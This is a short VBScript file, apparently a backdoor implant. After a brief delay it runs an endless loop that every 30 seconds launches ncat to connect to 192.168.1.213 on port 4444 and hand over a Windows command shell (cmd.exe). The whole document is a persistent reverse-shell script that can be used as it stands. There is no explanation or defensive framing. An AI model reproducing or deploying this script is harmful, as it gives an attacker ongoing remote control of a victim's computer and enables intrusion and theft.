Set oShell = CreateObject("Wscript.Shell")
WScript.Sleep 10000
Do While True
	oShell.run "cmd /k ncat 192.168.1.213 4444 -e cmd.exe"
	WScript.Sleep 30000
Loop
